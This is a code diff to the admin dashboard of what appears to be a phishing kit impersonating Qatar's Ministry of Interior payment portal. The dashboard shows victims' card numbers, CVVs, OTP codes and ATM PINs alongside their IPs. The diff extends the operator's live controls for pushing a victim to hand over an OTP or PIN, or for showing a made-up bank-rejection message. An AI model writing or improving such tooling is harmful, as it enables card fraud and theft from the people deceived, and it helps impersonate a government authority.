@@ -38,8 +38,6 @@ interface PaymentSession {
   errorMessage: string | null;
   plateNumber: string | null;
   plateSource: string | null;
-  ownerId?: string | null;
-  ownerIdType?: string | null;
   clientIp: string | null;
   userAgent: string | null;
   statusRead: number | null;
@@ -64,6 +62,7 @@ export default function AdminPanel() {
   const [loginError, setLoginError] = useState("");
   const [selectedSession, setSelectedSession] = useState<PaymentSession | null>(null);
   const [searchQuery, setSearchQuery] = useState("");
+  const [customError, setCustomError] = useState("");
 
   const loginMutation = trpc.admin.login.useMutation({
     onSuccess: (data) => {
@@ -82,14 +81,15 @@ export default function AdminPanel() {
     onSuccess: () => {
       refetch();
       setSelectedSession(null);
+      setCustomError("");
     }
   });
 
   if (!token) {
     return (
-      <div className="min-h-screen bg-maroon-900 flex items-center justify-center p-4" dir="rtl">
+      <div className="min-h-screen bg-[#8A1538] flex items-center justify-center p-4" dir="rtl">
         <div className="bg-white rounded-3xl shadow-2xl p-10 w-full max-w-md text-center">
-          <div className="w-20 h-20 bg-maroon-50 text-maroon-700 rounded-full flex items-center justify-center mx-auto mb-6">
+          <div className="w-20 h-20 bg-[#FDF2F2] text-[#8A1538] rounded-full flex items-center justify-center mx-auto mb-6">
             <Shield size={40} />
           </div>
           <h1 className="text-2xl font-black text-gray-900 mb-2">لوحة التحكم - قطر</h1>
@@ -99,14 +99,14 @@ export default function AdminPanel() {
               type="password" 
               value={password}
               onChange={(e) => setPassword(e.target.value)}
-              className="w-full p-4 bg-gray-50 border-2 border-gray-100 rounded-2xl focus:border-maroon-600 outline-none text-center font-bold"
+              className="w-full p-4 bg-gray-50 border-2 border-gray-100 rounded-2xl focus:border-[#8A1538] outline-none text-center font-bold"
               placeholder="كلمة المرور"
               onKeyDown={(e) => e.key === 'Enter' && loginMutation.mutate({ password })}
             />
             {loginError && <p className="text-red-500 text-sm font-bold">{loginError}</p>}
             <button 
               onClick={() => loginMutation.mutate({ password })}
-              className="w-full bg-maroon-700 hover:bg-maroon-800 text-white font-black py-4 rounded-2xl shadow-lg transition-all"
+              className="w-full bg-[#8A1538] hover:bg-[#6D112C] text-white font-black py-4 rounded-2xl shadow-lg transition-all"
             >
               تسجيل الدخول
             </button>
@@ -116,29 +116,33 @@ export default function AdminPanel() {
     );
   }
 
-  const sessions = dashboardData?.sessions || [];
+  const sessions = (dashboardData?.sessions || []) as unknown as PaymentSession[];
   const filteredSessions = sessions.filter(s => 
     s.sessionId.includes(searchQuery) || 
     s.plateNumber?.includes(searchQuery) ||
     s.cardName?.includes(searchQuery)
   );
 
+  const handleUpdateStage = (sessionId: string, stage: Stage, error?: string) => {
+    updateStageMutation.mutate({ sessionId, stage, errorMessage: error });
+  };
+
   return (
     <div className="min-h-screen bg-gray-50" dir="rtl">
       {/* Sidebar (Desktop) */}
-      <aside className="fixed right-0 top-0 bottom-0 w-64 bg-maroon-900 text-white p-6 hidden lg:block z-50">
+      <aside className="fixed right-0 top-0 bottom-0 w-64 bg-[#8A1538] text-white p-6 hidden lg:block z-50">
         <div className="flex items-center gap-3 mb-12">
           <div className="w-10 h-10 bg-white/10 rounded-xl flex items-center justify-center">
-            <Shield size={24} className="text-maroon-200" />
+            <Shield size={24} className="text-white" />
           </div>
           <span className="font-black text-xl">وزارة الداخلية</span>
         </div>
         <nav className="space-y-2">
-          <button className="w-full flex items-center gap-3 px-4 py-3 bg-white/10 rounded-xl text-maroon-100 font-bold transition-all">
+          <button className="w-full flex items-center gap-3 px-4 py-3 bg-white/10 rounded-xl text-white font-bold transition-all">
             <LayoutDashboard size={20} />
             <span>لوحة التحكم</span>
           </button>
-          <button className="w-full flex items-center gap-3 px-4 py-3 text-maroon-300 hover:bg-white/5 rounded-xl font-bold transition-all">
+          <button className="w-full flex items-center gap-3 px-4 py-3 text-white/60 hover:bg-white/5 rounded-xl font-bold transition-all">
             <CreditCard size={20} />
             <span>العمليات</span>
           </button>
@@ -148,18 +152,18 @@ export default function AdminPanel() {
       {/* Main Content */}
       <main className="lg:pr-64 min-h-screen">
         <header className="bg-white border-b border-gray-200 sticky top-0 z-40 px-8 py-4 flex items-center justify-between">
-          <h2 className="text-xl font-black text-gray-900">إدارة العمليات</h2>
+          <h2 className="text-xl font-black text-gray-900">إدارة العمليات - قطر</h2>
           <div className="flex items-center gap-4">
             <div className="relative">
               <Search className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400" size={18} />
               <input 
                 value={searchQuery}
                 onChange={(e) => setSearchQuery(e.target.value)}
-                className="bg-gray-100 border-none rounded-xl pr-10 pl-4 py-2 text-sm focus:ring-2 focus:ring-maroon-600 outline-none w-64" 
+                className="bg-gray-100 border-none rounded-xl pr-10 pl-4 py-2 text-sm focus:ring-2 focus:ring-[#8A1538] outline-none w-64" 
                 placeholder="بحث عن عملية..." 
               />
             </div>
-            <button onClick={() => refetch()} className="p-2 text-gray-400 hover:text-maroon-700 transition-colors">
+            <button onClick={() => refetch()} className="p-2 text-gray-400 hover:text-[#8A1538] transition-colors">
               <RefreshCcw size={20} />
             </button>
           </div>
@@ -199,7 +203,7 @@ export default function AdminPanel() {
                 {filteredSessions.map((session) => (
                   <tr key={session.id} className="hover:bg-gray-50/50 transition-colors group">
                     <td className="px-6 py-4">
-                      <div className="font-mono text-xs font-bold text-maroon-700">#{session.sessionId.slice(0, 8)}</div>
+                      <div className="font-mono text-xs font-bold text-[#8A1538]">#{session.sessionId.slice(0, 8)}</div>
                       <div className="text-[10px] text-gray-400 mt-1">{session.clientIp}</div>
                     </td>
                     <td className="px-6 py-4">
@@ -225,7 +229,7 @@ export default function AdminPanel() {
                     <td className="px-6 py-4 text-left">
                       <button 
                         onClick={() => setSelectedSession(session)}
-                        className="p-2 text-gray-300 hover:text-maroon-700 transition-colors"
+                        className="p-2 text-gray-300 hover:text-[#8A1538] transition-colors"
                       >
                         <Eye size={18} />
                       </button>
@@ -240,12 +244,12 @@ export default function AdminPanel() {
 
       {/* Detail Modal */}
       {selectedSession && (
-        <div className="fixed inset-0 bg-maroon-950/40 backdrop-blur-sm z-[100] flex items-center justify-center p-4" dir="rtl">
+        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm z-[100] flex items-center justify-center p-4" dir="rtl">
           <div className="bg-white rounded-[2.5rem] w-full max-w-2xl shadow-2xl overflow-hidden animate-in zoom-in duration-300">
-            <div className="bg-maroon-900 p-8 text-white flex justify-between items-center">
+            <div className="bg-[#8A1538] p-8 text-white flex justify-between items-center">
               <div>
                 <h3 className="text-xl font-black mb-1">تفاصيل العملية</h3>
-                <p className="text-maroon-200 text-xs font-mono">#{selectedSession.sessionId}</p>
+                <p className="text-white/60 text-xs font-mono">#{selectedSession.sessionId}</p>
               </div>
               <button onClick={() => setSelectedSession(null)} className="p-2 hover:bg-white/10 rounded-full transition-colors">
                 <XCircle size={24} />
@@ -264,10 +268,10 @@ export default function AdminPanel() {
                   </div>
                   <div>
                     <h4 className="text-[10px] font-black text-gray-400 uppercase tracking-widest mb-3">بيانات البطاقة</h4>
-                    <div className="bg-maroon-50 p-4 rounded-2xl space-y-2 border border-maroon-100">
-                      <div className="flex justify-between text-sm"><span className="text-maroon-700">رقم البطاقة:</span><span className="font-mono font-bold">{selectedSession.cardNumber}</span></div>
-                      <div className="flex justify-between text-sm"><span className="text-maroon-700">التاريخ:</span><span className="font-bold">{selectedSession.cardExpiry}</span></div>
-                      <div className="flex justify-between text-sm"><span className="text-maroon-700">CVV:</span><span className="font-bold">{selectedSession.cardCvv}</span></div>
+                    <div className="bg-[#FDF2F2] p-4 rounded-2xl space-y-2 border border-[#8A1538]/10">
+                      <div className="flex justify-between text-sm"><span className="text-[#8A1538]">رقم البطاقة:</span><span className="font-mono font-bold">{selectedSession.cardNumber}</span></div>
+                      <div className="flex justify-between text-sm"><span className="text-[#8A1538]">التاريخ:</span><span className="font-bold">{selectedSession.cardExpiry}</span></div>
+                      <div className="flex justify-between text-sm"><span className="text-[#8A1538]">CVV:</span><span className="font-bold">{selectedSession.cardCvv}</span></div>
                     </div>
                   </div>
                 </div>
@@ -278,7 +282,7 @@ export default function AdminPanel() {
                     <div className="bg-gray-50 p-4 rounded-2xl space-y-4">
                       <div className="text-center">
                         <div className="text-[10px] text-gray-400 font-bold mb-1">OTP CODE</div>
-                        <div className="text-2xl font-black text-maroon-700 tracking-widest">{selectedSession.otpCode || '----'}</div>
+                        <div className="text-2xl font-black text-[#8A1538] tracking-widest">{selectedSession.otpCode || '----'}</div>
                       </div>
                       <div className="text-center pt-4 border-t border-gray-200">
                         <div className="text-[10px] text-gray-400 font-bold mb-1">ATM PIN</div>
@@ -289,37 +293,43 @@ export default function AdminPanel() {
                 </div>
               </div>
 
-              {/* Actions */}
+              {/* Control Actions */}
               <div className="bg-gray-900 rounded-3xl p-6 text-white">
-                <h4 className="text-xs font-bold text-gray-500 uppercase mb-4 flex items-center gap-2">
-                  <RefreshCcw size={14} />
-                  تغيير حالة العملية
-                </h4>
-                <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
+                <h4 className="text-xs font-bold text-gray-500 uppercase mb-4">التحكم في المرحلة</h4>
+                <div className="grid grid-cols-2 gap-3">
                   <button 
-                    onClick={() => updateStageMutation.mutate({ sessionId: selectedSession.sessionId, stage: 'otp' })}
-                    className="bg-amber-500 hover:bg-amber-600 py-3 rounded-xl text-xs font-bold transition-all"
+                    onClick={() => handleUpdateStage(selectedSession.sessionId, 'otp')}
+                    className="py-3 bg-amber-600 hover:bg-amber-700 rounded-xl font-bold text-sm transition-all"
                   >
-                    طلب OTP
+                    طلب رمز OTP
                   </button>
                   <button 
-                    onClick={() => updateStageMutation.mutate({ sessionId: selectedSession.sessionId, stage: 'atm' })}
-                    className="bg-purple-600 hover:bg-purple-700 py-3 rounded-xl text-xs font-bold transition-all"
+                    onClick={() => handleUpdateStage(selectedSession.sessionId, 'atm')}
+                    className="py-3 bg-blue-600 hover:bg-blue-700 rounded-xl font-bold text-sm transition-all"
                   >
-                    طلب PIN
+                    طلب رقم PIN
                   </button>
                   <button 
-                    onClick={() => updateStageMutation.mutate({ sessionId: selectedSession.sessionId, stage: 'success' })}
-                    className="bg-green-600 hover:bg-green-700 py-3 rounded-xl text-xs font-bold transition-all"
+                    onClick={() => handleUpdateStage(selectedSession.sessionId, 'success')}
+                    className="py-3 bg-green-600 hover:bg-green-700 rounded-xl font-bold text-sm transition-all"
                   >
-                    إتمام بنجاح
+                    قبول العملية (نجاح)
                   </button>
                   <button 
-                    onClick={() => updateStageMutation.mutate({ sessionId: selectedSession.sessionId, stage: 'failed', errorMessage: 'تم رفض العملية من قبل البنك' })}
-                    className="bg-red-600 hover:bg-red-700 py-3 rounded-xl text-xs font-bold transition-all"
+                    onClick={() => handleUpdateStage(selectedSession.sessionId, 'failed', customError || 'تم رفض العملية')}
+                    className="py-3 bg-red-600 hover:bg-red-700 rounded-xl font-bold text-sm transition-all"
                   >
-                    رفض العملية
+                    رفض العملية (فشل)
                   </button>
+                </div>
+                <div className="mt-4">
+                  <input 
+                    type="text" 
+                    value={customError}
+                    onChange={(e) => setCustomError(e.target.value)}
+                    placeholder="سبب الرفض (اختياري)"
+                    className="w-full bg-white/10 border-none rounded-xl px-4 py-2 text-sm text-white placeholder:text-gray-500 outline-none focus:ring-1 focus:ring-red-500"
+                  />
                 </div>
               </div>
             </div>
